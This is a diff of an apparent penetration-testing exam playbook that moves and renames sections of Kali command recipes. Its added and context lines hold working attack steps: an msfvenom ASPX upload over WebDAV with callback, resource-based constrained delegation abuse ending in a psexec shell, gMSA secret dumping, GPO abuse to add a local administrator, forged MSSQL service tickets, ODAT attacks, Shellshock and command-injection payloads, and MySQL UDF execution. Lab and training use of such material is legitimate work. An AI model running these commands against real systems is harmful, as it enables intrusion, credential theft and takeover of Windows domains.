@@ -54,6 +54,7 @@ Sources SHA-256: `ecec4118a4af2cf2dc8f29b82712febe898620d82e82079be85ef91df4a5a7
 
 # network
 
+
 Run from Kali. Replace `<TARGET_IP>` with the assigned box.
 
 ## NET-01. Check connectivity
@@ -153,7 +154,11 @@ Pick one service with a real lead and open its task. An unidentified service ret
 - other_service: No task matches the service. Keep a specific gap. Next: GAP-SERVICE.
 - no_justified_lead: No service has a lead. Keep a resumable pause. Next: PAUSE-COVERAGE.
 
-# file_services
+# ftp
+
+One authorized write test on an observed FTP path.
+
+Verified FTPS or STARTTLS listing on one endpoint.
 
 ## FTP-01. List under the exact permitted identity
 
@@ -203,6 +208,43 @@ sed -n '1,80p' './<LOCAL_COPY>.bin' | cat -v
 
 Delete the copy once it is triaged: `rm -i -- './<LOCAL_COPY>.bin'`.
 
+## FTP-03. Does one observed FTP write path accept and remove an inert file?
+
+```bash
+printf 'probe\n' | curl --disable --globoff -sS --fail --user '<USERNAME>' --upload-file - 'ftp://<TARGET_IP>:<PORT>/<DIR>/probe-<ID>.txt'
+curl --disable --globoff -sS --fail --user '<USERNAME>' -o probe.copy 'ftp://<TARGET_IP>:<PORT>/<DIR>/probe-<ID>.txt'
+curl --disable --globoff --list-only -sS --fail --user '<USERNAME>' --quote '+DELE probe-<ID>.txt' 'ftp://<TARGET_IP>:<PORT>/<DIR>/'
+rm probe.copy
+```
+
+| Result | Next |
+| --- | --- |
+| Upload, read and delete succeed | **NET-05**; not execution. |
+| Write denied | **FTP-01** / **NET-05**. |
+| Upload ok, read fails | Attempt cleanup, otherwise **PAUSE-RECOVERY**. |
+| Delete denied or file remains | **PAUSE-RECOVERY**. |
+
+## FTP-04. Does the observed FTP TLS endpoint give a verified listing?
+
+Implicit FTPS:
+
+```bash
+curl --disable --globoff --path-as-is -sS --fail --ftp-pasv --cacert '<CA>' --resolve '<CERT_HOST>:<PORT>:<TARGET_IP>' --user '<USERNAME>' -w 'TLS %{ssl_verify_result}\n' 'ftps://<CERT_HOST>:<PORT>/<DIR>/'
+```
+
+For STARTTLS use `--ssl-reqd` and `ftp://`.
+
+| Result | Next |
+| --- | --- |
+| Verified TLS and listing | **FTP-02** in this TLS context. |
+| Certificate failure | **PAUSE-ROUTE**; do not use `-k`. |
+| TLS fails before auth | **NET-03**. |
+| Login denied | **NET-05**. |
+
+# smb
+
+One authorized write test on an observed SMB path.
+
 ## SMB-01 List shares for the current identity
 
 Enter when: SMB answered.
@@ -249,6 +291,31 @@ quit
 | Share writable and write test permitted | **SMB-03**. |
 | Timeout or partial copy | Not a completed read; retry or **PAUSE-COVERAGE**. |
 
+## SMB-03. Does one observed SMB write path accept and remove an inert file?
+
+Enter when: SMB-02 read access works and write access is the question.
+
+```bash
+smbclient '//<TARGET_IP>/<SHARE>' -I '<TARGET_IP>' -p '<SMB_PORT>' -U '<DOMAIN_OR_SERVER>\<USERNAME>' --timeout 15
+```
+
+At the prompt, create, list, delete:
+
+```text
+ls
+put /etc/hostname "probe-<RUN_ID>.txt"
+ls "probe-<RUN_ID>.txt"
+del "probe-<RUN_ID>.txt"
+quit
+```
+
+| Result | Next |
+| --- | --- |
+| Write, read-back and delete all succeed | Record the writable path; **NET-05** or the application that consumes it. |
+| Write denied | **NET-05**. Read access did not imply write. |
+| Write succeeds, delete fails | Keep the path and go to **PAUSE-RECOVERY**. |
+| Transport or identity error | **SMB-01**. |
+
 # remote_access
 
 ## SSH-01 Check the observed SSH access boundary
@@ -291,6 +358,7 @@ hostname; id; uname -s
 | Logged in but host or identity unverified | **EXP-03**. |
 
 # http
+
 
 Work one origin at a time: scheme, hostname, port.
 
@@ -491,9 +559,7 @@ Optional default-file pass: `nikto -h '<TARGET_URL>' -Tuning 2b`. A `DAV` header
 | Useful default file | **WEB-01**. |
 | Nothing confirmed | **NET-05**. |
 
-# windows_ad
-
-AD tasks assume an assigned controller and, from AD-03, a validated credential. WIN tasks assume an already attributed Windows shell. Use one credential form, not both.
+# ad
 
 ## AD-01 Identify the domain and controller
 
@@ -761,6 +827,112 @@ In an elevated shell instead: `& '<MIMIKATZ>' 'privilege::debug' 'sekurlsa::logo
 | WinRM observed with matching identity | **AD-12**. |
 | Nothing useful | **PAUSE-COVERAGE**. |
 
+## AD-15. Test one authenticated WebDAV write and callback
+
+```bash
+curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' -X PROPFIND -H 'Depth: 1' '<TARGET_URL>'
+curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' -X PROPFIND -H 'Depth: 0' '<TARGET_URL>/<NEW_FILE>'
+curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' --upload-file 'proof.aspx' '<TARGET_URL>/<NEW_FILE>'
+curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' '<TARGET_URL>/<NEW_FILE>'
+curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' -X DELETE '<TARGET_URL>/<NEW_FILE>'
+```
+
+Create the ASPX with msfvenom and start a listener before the trigger.
+
+| Result | Next |
+| --- | --- |
+| Callback and confirmed delete | **WIN-01**. |
+| Listing or write denied | **WEB-12**. |
+| Write, no callback | **PAUSE-COVERAGE**, delete the file. |
+| Delete unconfirmed | **PAUSE-RECOVERY**. |
+
+## AD-16. Use one controlled computer only from an empty RBCD baseline
+
+Enter on a disposable lab with a verified computer-control edge and empty RBCD.
+
+```text
+nxc ldap <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' -M maq
+impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -action read -dc-ip '<DC_IP>' '<DOMAIN>/<USERNAME>'
+impacket-addcomputer -computer-name '<NEW_COMPUTER>$' -computer-pass '<PASSWORD>' -dc-ip '<DC_IP>' '<DOMAIN>/<USERNAME>'
+impacket-rbcd -delegate-from '<NEW_COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action write -dc-ip '<DC_IP>' '<DOMAIN>/<USERNAME>'
+impacket-getST -spn 'cifs/<TARGET_HOST>' -impersonate '<TARGET_USER>' -dc-ip '<DC_IP>' '<DOMAIN>/<NEW_COMPUTER>$:<PASSWORD>'
+KRB5CCNAME='<CCACHE>' impacket-psexec -k -no-pass '<DOMAIN>/<TARGET_USER>@<TARGET_HOST>'
+```
+
+Cleanup: remove the delegate, delete the computer, then read both back.
+
+| Result | Next |
+| --- | --- |
+| Shell and clean baseline verified | **WIN-01**. |
+| Quota, edge or baseline absent | **AD-09**. |
+| Stage failed | **PAUSE-COVERAGE**; run only the matching cleanup. |
+| Cleanup uncertain | **PAUSE-RECOVERY**. |
+
+## AD-17. Read one gMSA secret only with its verified right
+
+```text
+nxc ldap <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --gmsa
+```
+
+| Result | Next |
+| --- | --- |
+| Account material returned | **AD-12** if WinRM is observed. |
+| Denied or wrong account | **AD-09**. |
+| Ambiguous | **PAUSE-COVERAGE**. |
+
+## AD-18. Change one controlled GPO with a fresh backup and restore
+
+```powershell
+Get-GPO -Name '<GPO_NAME>'
+Backup-GPO -Name '<GPO_NAME>' -Path '<NEW_BACKUP_DIR>'
+& '<SHARPGPOABUSE>' --AddLocalAdmin --UserAccount '<USERNAME>' --GPOName '<GPO_NAME>'
+gpupdate.exe /force; net localgroup administrators
+Restore-GPO -Name '<GPO_NAME>' -Path '<NEW_BACKUP_DIR>'
+```
+
+| Result | Next |
+| --- | --- |
+| Membership appears on the exact host | **AD-13**, then restore. |
+| Right, host or backup missing | **AD-09**. |
+| Success text, no membership | **PAUSE-COVERAGE**. |
+| Restore unconfirmed | **PAUSE-RECOVERY**. |
+
+## AD-19. Exercise one exact AD object-control right
+
+Group path:
+
+```text
+bloodyAD -H <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' get object '<TARGET_GROUP>' --attr member
+bloodyAD -H <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' add groupMember '<TARGET_GROUP>' '<USERNAME>'
+bloodyAD -H <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' remove groupMember '<TARGET_GROUP>' '<USERNAME>'
+```
+
+Password path instead: `bloodyAD ... set password '<TARGET_USER>' '<NEW_PASSWORD>'` and validate once through AD-03.
+
+| Result | Next |
+| --- | --- |
+| Membership verified | **AD-12** or **AD-13**. |
+| Reset account authenticates | **AD-12** / **AD-13**; reset stays owed. |
+| Edge mismatch | **AD-09**. |
+| Cleanup incomplete | **PAUSE-RECOVERY**. |
+
+## AD-20. Use one exact MSSQL service ticket to test SQL access
+
+Enter with the MSSQLSvc SPN, service secret, domain SID, user and a live tunnel.
+
+```text
+impacket-ticketer -password '<SERVICE_PASSWORD>' -domain-sid '<SID>' -domain '<DOMAIN>' -spn 'MSSQLSvc/<TARGET_HOST>:<PORT>' '<TARGET_USER>'
+KRB5CCNAME='<CCACHE>' impacket-mssqlclient -windows-auth -k -no-pass '<DOMAIN>/<TARGET_USER>@<TARGET_HOST>' -target-ip 127.0.0.1 -port <LOCAL_PORT>
+```
+
+| Result | Next |
+| --- | --- |
+| SQL prompt | **DB-04**. |
+| SPN, time or tunnel mismatch | **PAUSE-ROUTE**. |
+| SQL rejects the ticket | **PAUSE-COVERAGE**. |
+
+# windows
+
 ## WIN-01. Identify this Windows shell
 
 Enter when: you have a new Windows shell or changed token.
@@ -1011,76 +1183,6 @@ hostname; whoami /all
 | Crash or partial transition | **PAUSE-RECOVERY**. |
 | No changed process | **PAUSE-COVERAGE**, reset first. |
 
-## AD-15. Test one authenticated WebDAV write and callback
-
-```bash
-curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' -X PROPFIND -H 'Depth: 1' '<TARGET_URL>'
-curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' -X PROPFIND -H 'Depth: 0' '<TARGET_URL>/<NEW_FILE>'
-curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' --upload-file 'proof.aspx' '<TARGET_URL>/<NEW_FILE>'
-curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' '<TARGET_URL>/<NEW_FILE>'
-curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' -X DELETE '<TARGET_URL>/<NEW_FILE>'
-```
-
-Create the ASPX with msfvenom and start a listener before the trigger.
-
-| Result | Next |
-| --- | --- |
-| Callback and confirmed delete | **WIN-01**. |
-| Listing or write denied | **WEB-12**. |
-| Write, no callback | **PAUSE-COVERAGE**, delete the file. |
-| Delete unconfirmed | **PAUSE-RECOVERY**. |
-
-## AD-16. Use one controlled computer only from an empty RBCD baseline
-
-Enter on a disposable lab with a verified computer-control edge and empty RBCD.
-
-```text
-nxc ldap <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' -M maq
-impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -action read -dc-ip '<DC_IP>' '<DOMAIN>/<USERNAME>'
-impacket-addcomputer -computer-name '<NEW_COMPUTER>$' -computer-pass '<PASSWORD>' -dc-ip '<DC_IP>' '<DOMAIN>/<USERNAME>'
-impacket-rbcd -delegate-from '<NEW_COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action write -dc-ip '<DC_IP>' '<DOMAIN>/<USERNAME>'
-impacket-getST -spn 'cifs/<TARGET_HOST>' -impersonate '<TARGET_USER>' -dc-ip '<DC_IP>' '<DOMAIN>/<NEW_COMPUTER>$:<PASSWORD>'
-KRB5CCNAME='<CCACHE>' impacket-psexec -k -no-pass '<DOMAIN>/<TARGET_USER>@<TARGET_HOST>'
-```
-
-Cleanup: remove the delegate, delete the computer, then read both back.
-
-| Result | Next |
-| --- | --- |
-| Shell and clean baseline verified | **WIN-01**. |
-| Quota, edge or baseline absent | **AD-09**. |
-| Stage failed | **PAUSE-COVERAGE**; run only the matching cleanup. |
-| Cleanup uncertain | **PAUSE-RECOVERY**. |
-
-## AD-17. Read one gMSA secret only with its verified right
-
-```text
-nxc ldap <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --gmsa
-```
-
-| Result | Next |
-| --- | --- |
-| Account material returned | **AD-12** if WinRM is observed. |
-| Denied or wrong account | **AD-09**. |
-| Ambiguous | **PAUSE-COVERAGE**. |
-
-## AD-18. Change one controlled GPO with a fresh backup and restore
-
-```powershell
-Get-GPO -Name '<GPO_NAME>'
-Backup-GPO -Name '<GPO_NAME>' -Path '<NEW_BACKUP_DIR>'
-& '<SHARPGPOABUSE>' --AddLocalAdmin --UserAccount '<USERNAME>' --GPOName '<GPO_NAME>'
-gpupdate.exe /force; net localgroup administrators
-Restore-GPO -Name '<GPO_NAME>' -Path '<NEW_BACKUP_DIR>'
-```
-
-| Result | Next |
-| --- | --- |
-| Membership appears on the exact host | **AD-13**, then restore. |
-| Right, host or backup missing | **AD-09**. |
-| Success text, no membership | **PAUSE-COVERAGE**. |
-| Restore unconfirmed | **PAUSE-RECOVERY**. |
-
 ## WIN-09. Keep one recoverable accessibility-binary test
 
 Enter with `SeRestorePrivilege`, a trusted RDP path and a tested reset.
@@ -1136,25 +1238,6 @@ Restore the backup, or remove the DLL if it was absent, and reset the broad ACL 
 | No callback | Restore, then **PAUSE-COVERAGE**. |
 | Custody or reset uncertain | **PAUSE-RECOVERY**. |
 
-## AD-19. Exercise one exact AD object-control right
-
-Group path:
-
-```text
-bloodyAD -H <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' get object '<TARGET_GROUP>' --attr member
-bloodyAD -H <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' add groupMember '<TARGET_GROUP>' '<USERNAME>'
-bloodyAD -H <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' remove groupMember '<TARGET_GROUP>' '<USERNAME>'
-```
-
-Password path instead: `bloodyAD ... set password '<TARGET_USER>' '<NEW_PASSWORD>'` and validate once through AD-03.
-
-| Result | Next |
-| --- | --- |
-| Membership verified | **AD-12** or **AD-13**. |
-| Reset account authenticates | **AD-12** / **AD-13**; reset stays owed. |
-| Edge mismatch | **AD-09**. |
-| Cleanup incomplete | **PAUSE-RECOVERY**. |
-
 ## WIN-12. Verify and contain one Windows loopback service
 
 ```powershell
@@ -1172,22 +1255,8 @@ On Kali: `chisel server --reverse --port '<PORT>'`, then `nmap -sT -Pn -p '<LOCA
 | Port does not close | **PAUSE-RECOVERY**. |
 | Forwarded service lives on another internal host | **PIVOT-01**. |
 
-## AD-20. Use one exact MSSQL service ticket to test SQL access
-
-Enter with the MSSQLSvc SPN, service secret, domain SID, user and a live tunnel.
-
-```text
-impacket-ticketer -password '<SERVICE_PASSWORD>' -domain-sid '<SID>' -domain '<DOMAIN>' -spn 'MSSQLSvc/<TARGET_HOST>:<PORT>' '<TARGET_USER>'
-KRB5CCNAME='<CCACHE>' impacket-mssqlclient -windows-auth -k -no-pass '<DOMAIN>/<TARGET_USER>@<TARGET_HOST>' -target-ip 127.0.0.1 -port <LOCAL_PORT>
-```
-
-| Result | Next |
-| --- | --- |
-| SQL prompt | **DB-04**. |
-| SPN, time or tunnel mismatch | **PAUSE-ROUTE**. |
-| SQL rejects the ticket | **PAUSE-COVERAGE**. |
-
 # adcs
+
 
 `certipy-ad` is a Kali package; keep issued PFX files in a private directory.
 
@@ -1373,7 +1442,9 @@ certipy-ad auth -pfx administrator.pfx -username administrator -domain '<DOMAIN>
 | Auth returns the target's TGT/hash | **AD-03** or **AD-13**. |
 | Mapping still strong | Use **ADCS-02** with a subject-enabled template. |
 | Auth fails | **PAUSE-COVERAGE**; check the UPN and CA name. |
+
 # ad_abuse
+
 
 Stage Responder, impacket, `PetitPotam.py` and `printerbug.py` from Kali or GitHub; `dnstool.py` is part of krbrelayx.
 
@@ -1585,7 +1656,9 @@ KRB5CCNAME='administrator.ccache' impacket-psexec -k -no-pass '<DOMAIN>/administ
 | Target ticket issued | **WIN-01** in the shell. |
 | `KDC_ERR_BADOPTION` | Check the SPN pair and the delegating ticket. |
 | Ticket mismatch | **PAUSE-COVERAGE**. |
+
 # password_attacks
+
 
 Spray, guess or crack one credential source at a time.
 
@@ -1685,6 +1758,7 @@ Supply `-s <PORT>` for a non-standard port and `-S` for HTTPS. Add `-t 16` only 
 | 429 or timeouts | Retry once with a lower `-t`; then **PAUSE-COVERAGE**. |
 | List exhausted, form correct | **PAUSE-COVERAGE**; record the list and failure string. |
 | CSRF token or JavaScript-built body | Use Burp Intruder instead; **WEB-08**. |
+
 # redis
 
 ## REDIS-01. Does this Redis endpoint permit the intended connection?
@@ -1756,8 +1830,6 @@ system.exec "hostname"
 | Attributable output from the assigned host | **SHELL-01** if a socket shell exists, then **EXP-03** / **LNX-01**. |
 | Command missing or host conflict | **EXP-02**. |
 | State changed, proof uncertain | **PAUSE-RECOVERY**. |
-
-# redis_exploitation
 
 ## REXP-01. Do the rogue-replication prerequisites hold?
 
@@ -1886,6 +1958,7 @@ After SSH work, exit your shells, recheck the route and send the actual closing 
 | Port open or baseline unconfirmed | **PAUSE-RECOVERY**. |
 
 # windows_privilege
+
 
 Stage the reviewed driver/loader, Incognito, UACME and SharpDPAPI binaries.
 
@@ -2106,7 +2179,8 @@ Mimikatz equivalent: `dpapi::cred /in:"<FILE>"`. A masterkey is needed for a dif
 | Plaintext credential | **AD-03** or **WIN-10**. |
 | Blob needs another user's masterkey | Record the file; **GAP-ACCESS**. |
 | No files | **WIN-03**. |
-# dns_nfs
+
+# dns
 
 Replace every `<...>` value before running its command.
 
@@ -2163,6 +2237,10 @@ Only run AXFR when the zone transfer is authorized.
 | AXFR returns records | Pick one name through **DNS-01**. |
 | Refused or timed out | **NET-05**. |
 | Partial transfer | **PAUSE-COVERAGE**. |
+
+# nfs
+
+Replace every `<...>` value before running its command.
 
 ## NFS-01 — What export and client context are actually available?
 
@@ -2226,6 +2304,7 @@ sudo umount -- '/tmp/owb-nfs-w' && rmdir -- '/tmp/owb-nfs-w'
 | Owner differs from your `id` | **GAP-ACCESS**. |
 
 # snmp
+
 
 Run this in Kali against one authorized target. Community strings go straight on
 the command line; that is normal on a lab box. A `199/tcp smux` listener is the
@@ -2305,6 +2384,7 @@ rm -i snmp.txt
 
 # database
 
+
 `odat` comes from GitHub and `lib_mysqludf_sys` from its source tree.
 
 `odat` comes from GitHub and `lib_mysqludf_sys` from its source tree.
@@ -2363,6 +2443,10 @@ Check `SHOW GRANTS` or `Ssl_cipher` only when the next decision needs them.
 
 The question set follows the [source checklist](../references/checklist.md).
 
+# oracle
+
+Confirm the engine from its response before picking a client. One supplied identity per endpoint.
+
 ## DB-06. Can the Oracle identity read bounded metadata?
 
 Enter with a verified Oracle listener and assigned service/wallet context.
@@ -2396,6 +2480,27 @@ PY
 | TLS or wallet failure | **PAUSE-ROUTE**. |
 | Query unavailable | **PAUSE-COVERAGE**. |
 
+## DB-13. Can Oracle be attacked with ODAT? (optional)
+
+**Optional.** Safe to skip under exam time pressure.
+
+```bash
+odat all -s '<TARGET_IP>' -p 1521
+odat dbms -s '<TARGET_IP>' -p 1521
+```
+
+An exposed listener with default or weak credentials is the usual prerequisite.
+
+| Result | Next |
+| --- | --- |
+| Credentials or privileges found | **DB-06** for metadata, then ODAT modules. |
+| Listener only | **PAUSE-COVERAGE**. |
+| No ODAT | **DB-06**. |
+
+# postgresql
+
+Confirm the engine from its response before picking a client. One supplied identity per endpoint.
+
 ## DB-07. Can this PostgreSQL role run a fixed server-side identity command?
 
 ```sql
@@ -2427,6 +2532,10 @@ Or decode the hex locally: `printf '%s' '<HEX>' | xxd -r -p | head -c 4096 | cat
 | Relevant content | Matching application or service task. |
 | Missing file | **PAUSE-COVERAGE**. |
 | Permission denied | **NET-05**. |
+
+# mysql
+
+Confirm the engine from its response before picking a client. One supplied identity per endpoint.
 
 ## DB-12. Can MySQL load a UDF?
 
@@ -2460,22 +2569,6 @@ SELECT sys_exec('id > /tmp/owb');
 
 Drop the function and file only after the shell exists.
 
-## DB-13. Can Oracle be attacked with ODAT? (optional)
-
-**Optional.** Safe to skip under exam time pressure.
-
-```bash
-odat all -s '<TARGET_IP>' -p 1521
-odat dbms -s '<TARGET_IP>' -p 1521
-```
-
-An exposed listener with default or weak credentials is the usual prerequisite.
-
-| Result | Next |
-| --- | --- |
-| Credentials or privileges found | **DB-06** for metadata, then ODAT modules. |
-| Listener only | **PAUSE-COVERAGE**. |
-| No ODAT | **DB-06**. |
 # mssql
 
 ## DB-03. Can the assigned SQL login connect to this verified SQL Server?
@@ -2588,7 +2681,7 @@ A captured NetNTLMv2 hash goes to **PASS-02** or **RELAY-02**. For `db_owner`, u
 
 Stop Responder after the capture.
 
-# mail_rdp
+# mail
 
 ## MAIL-01. What protocol and TLS context does this endpoint offer?
 
@@ -2663,6 +2756,8 @@ PY
 | Login denied | **NET-05**. |
 | TOP denied | **NET-05**. |
 
+# rdp
+
 ## RDP-01. Can the supplied account open the assigned desktop?
 
 ```bash
@@ -2693,11 +2788,7 @@ whoami
 
 Continue with the Windows token check at [WIN-01](./win-01.md).
 
-# other_services
-
-`vncpasswd.py` is not stock Kali.
-
-`vncpasswd.py` is not stock Kali.
+# smtp
 
 Service-specific paths that NET-05 can select.
 
@@ -2719,6 +2810,10 @@ Send to an external address to test relay. `250` after `RCPT` is acceptance, not
 | `VRFY` disabled | `smtp-user-enum -M RCPT` once. |
 | Connection refused | **NET-03**. |
 
+# tftp
+
+Service-specific paths that NET-05 can select.
+
 ## TFTP-01. Can a file be read?
 
 ```bash
@@ -2733,6 +2828,10 @@ At the prompt: `binary`, `get <FILE>`, `quit`.
 | File retrieved | **ART-01** if it contains a lead. |
 | Timeout | **NET-04**. |
 | No file name | Try `README`, `config`, `backup.zip` once each. |
+
+# rsync
+
+Service-specific paths that NET-05 can select.
 
 ## RSYNC-01. Is a module exposed?
 
@@ -2750,6 +2849,10 @@ rsync -av 'rsync://<TARGET_IP>/<MODULE>' ./rsync-copy/
 
 Delete the local copy after triage.
 | Connection refused | **NET-03**. |
+
+# docker
+
+Service-specific paths that NET-05 can select.
 
 ## DOCKER-01. Is the Docker API unauthenticated?
 
@@ -2780,6 +2883,10 @@ curl -sS -X POST 'http://<TARGET_IP>:2375/containers/owb/stop'
 curl -sS -X DELETE 'http://<TARGET_IP>:2375/containers/owb?force=1'
 ```
 
+# jenkins
+
+Service-specific paths that NET-05 can select.
+
 ## JENKINS-01. Is the script console open?
 
 ```bash
@@ -2799,6 +2906,10 @@ println "id".execute().text
 | 401 | Try `admin:admin`; otherwise **PAUSE-COVERAGE**. |
 | No console | **WEB-04**. |
 
+# ipmi
+
+Service-specific paths that NET-05 can select.
+
 ## IPMI-01. Is the BMC reachable on UDP 623?
 
 ```bash
@@ -2814,6 +2925,10 @@ ipmitool -I lanplus -H '<TARGET_IP>' -U ADMIN -P ADMIN chassis status
 
 Mode 7300 is IPMI2 RAKP HMAC-SHA1.
 
+# vnc
+
+`vncpasswd.py` is not stock Kali.
+Service-specific paths that NET-05 can select.
 
 ## VNC-01. Is VNC exposed? (optional)
 
@@ -2832,7 +2947,9 @@ A stored password file can be decrypted offline with `vncpasswd.py -d <FILE>`.
 | Password required | Try a recovered value once. |
 | Auth failure | **PAUSE-COVERAGE**. |
 
+# ntp
 
+Service-specific paths that NET-05 can select.
 
 ## NTP-01. Is NTP answering? (optional)
 
@@ -2850,7 +2967,9 @@ Useful for a clock-skew issue with Kerberos, not usually a path by itself.
 | Server responds with peers | Record it; **AD-01** if Kerberos time fails. |
 | No response | **NET-04**. |
 
+# x11
 
+Service-specific paths that NET-05 can select.
 
 ## X11-01. Is an X server open? (optional)
 
@@ -2866,6 +2985,10 @@ xdpyinfo -display '<TARGET_IP>:0'
 | Access granted | Capture the screen with `xwd` or read the display. |
 | Access denied | **PAUSE-COVERAGE**. |
 
+# squid
+
+Service-specific paths that NET-05 can select.
+
 ## SQUID-01. Is Squid an open proxy?
 
 ```bash
@@ -2877,6 +3000,10 @@ proxychains -f proxychains.conf curl -sS 'http://<INTERNAL_HOST>/'
 | --- | --- |
 | Internal content returned | **NET-05** on the internal host. |
 | Denied | **PAUSE-COVERAGE**. |
+
+# generic
+
+Service-specific paths that NET-05 can select.
 
 ## GENERIC-01. Unfamiliar service, what now?
 
@@ -2902,7 +3029,9 @@ nc -nv '<TARGET_IP>' '<PORT>'
 | --- | --- |
 | Matching source and prerequisites | **EXP-02**. |
 | No source | **PAUSE-COVERAGE** with the exact product. |
+
 # web_input
+
 
 Start from the working request at WEB-06/08. Form stays POST: repeat every required field and a fresh CSRF value. For an existing session add `--header '@<HEADERS>'` only on the same origin.
 
@@ -2980,77 +3109,8 @@ Then use the observed delete/reset route and re-read the view; the marker must b
 | Cleanup fails or marker remains | **PAUSE-RECOVERY**. |
 | Session or rate limit | **WEB-09** / **PAUSE-COVERAGE**. |
 
-# ftp_write
-
-One authorized write test on an observed FTP path.
-
-## FTP-03. Does one observed FTP write path accept and remove an inert file?
-
-```bash
-printf 'probe\n' | curl --disable --globoff -sS --fail --user '<USERNAME>' --upload-file - 'ftp://<TARGET_IP>:<PORT>/<DIR>/probe-<ID>.txt'
-curl --disable --globoff -sS --fail --user '<USERNAME>' -o probe.copy 'ftp://<TARGET_IP>:<PORT>/<DIR>/probe-<ID>.txt'
-curl --disable --globoff --list-only -sS --fail --user '<USERNAME>' --quote '+DELE probe-<ID>.txt' 'ftp://<TARGET_IP>:<PORT>/<DIR>/'
-rm probe.copy
-```
-
-| Result | Next |
-| --- | --- |
-| Upload, read and delete succeed | **NET-05**; not execution. |
-| Write denied | **FTP-01** / **NET-05**. |
-| Upload ok, read fails | Attempt cleanup, otherwise **PAUSE-RECOVERY**. |
-| Delete denied or file remains | **PAUSE-RECOVERY**. |
-
-# ftp_tls
-
-Verified FTPS or STARTTLS listing on one endpoint.
-
-## FTP-04. Does the observed FTP TLS endpoint give a verified listing?
-
-Implicit FTPS:
-
-```bash
-curl --disable --globoff --path-as-is -sS --fail --ftp-pasv --cacert '<CA>' --resolve '<CERT_HOST>:<PORT>:<TARGET_IP>' --user '<USERNAME>' -w 'TLS %{ssl_verify_result}\n' 'ftps://<CERT_HOST>:<PORT>/<DIR>/'
-```
-
-For STARTTLS use `--ssl-reqd` and `ftp://`.
-
-| Result | Next |
-| --- | --- |
-| Verified TLS and listing | **FTP-02** in this TLS context. |
-| Certificate failure | **PAUSE-ROUTE**; do not use `-k`. |
-| TLS fails before auth | **NET-03**. |
-| Login denied | **NET-05**. |
-
-# smb_write
-
-One authorized write test on an observed SMB path.
-
-## SMB-03. Does one observed SMB write path accept and remove an inert file?
-
-Enter when: SMB-02 read access works and write access is the question.
-
-```bash
-smbclient '//<TARGET_IP>/<SHARE>' -I '<TARGET_IP>' -p '<SMB_PORT>' -U '<DOMAIN_OR_SERVER>\<USERNAME>' --timeout 15
-```
-
-At the prompt, create, list, delete:
-
-```text
-ls
-put /etc/hostname "probe-<RUN_ID>.txt"
-ls "probe-<RUN_ID>.txt"
-del "probe-<RUN_ID>.txt"
-quit
-```
-
-| Result | Next |
-| --- | --- |
-| Write, read-back and delete all succeed | Record the writable path; **NET-05** or the application that consumes it. |
-| Write denied | **NET-05**. Read access did not imply write. |
-| Write succeeds, delete fails | Keep the path and go to **PAUSE-RECOVERY**. |
-| Transport or identity error | **SMB-01**. |
-
 # command_continuation
+
 
 Enter only with known quoting and a safe original command. GET shown; for a form use `--request POST` and repeat required fields.
 
@@ -3098,6 +3158,7 @@ sed -n '1,60p' verify.body | cat -v
 
 # command_shell
 
+
 Enter after WEXEC-01/02 proved execution and you know the Bash path and quote context.
 
 ## WEXEC-04. Can verified unquoted Linux command input provide a usable shell?
@@ -3140,6 +3201,7 @@ Double-quoted uses `<FIELD>=<BENIGN_VALUE>"; <BASH> -c "exec ..."; #`. Verify as
 | Wrong host | **PAUSE-ROUTE**. |
 
 # sql_continuation
+
 
 Enter with a calibrated true/false channel and known quote context.
 
@@ -3225,6 +3287,7 @@ python3 -c 'import sys; print(chr(int(sys.argv[1])))' '<CODE>'
 
 # web_upload
 
+
 `uploadserver` is a pipx package, not stock Kali.
 
 `uploadserver` is a pipx package, not stock Kali.
@@ -3298,6 +3361,7 @@ AddType application/x-httpd-php .owb
 | Extension rejected | `.htaccess` route, then **WEB-08**. |
 
 Delete the uploaded file through the app afterwards. **Optional** when the plain upload already executes.
+
 # web_editor
 
 ## WEDIT-01. Can a template execute PHP and restore cleanly?
@@ -3338,6 +3402,7 @@ Restore before closing: paste `original.php` back, save once, re-read, compare w
 | Restore mismatch or broken page | **PAUSE-RECOVERY** with the out-of-band route. |
 
 # web_advanced
+
 
 `php_filter_chain_generator` and `uploadserver` are staged tools.
 
@@ -3460,6 +3525,7 @@ curl -sS -i -H 'User-Agent: () { :; }; /bin/bash -c "id"' 'http://<TARGET_IP>/cg
 | `uid=` in the headers/body | **EXP-01** for a Bash callback. |
 | No output | Try another script from WEB-04. |
 | 500 only | **PAUSE-COVERAGE**. |
+
 ## WEB-20. Does the input evaluate a template expression?
 
 ```bash
@@ -3586,8 +3652,6 @@ user=admin*
 | No change | **WEB-08** for the actual body format. |
 | Error reveals an engine | **PAUSE-COVERAGE**. |
 
-
-
 ## WEB-27. Is the API GraphQL or OAuth? (optional)
 
 **Optional.** Safe to skip under exam time pressure.
@@ -3603,7 +3667,9 @@ OAuth: change `redirect_uri` to your host and watch for a code leak; check API v
 | Schema or code returned | Enumerate one interesting type or replay the code. |
 | Disabled introspection | **PAUSE-COVERAGE**. |
 | No GraphQL/OAuth | **WEB-01**. |
+
 # access
+
 
 Candidate review, attempt result and session attribution.
 
@@ -3678,11 +3744,8 @@ Windows token work continues at [WIN-01](./win-01.md).
 | Some checks denied | **GAP-ACCESS** if unattributable. |
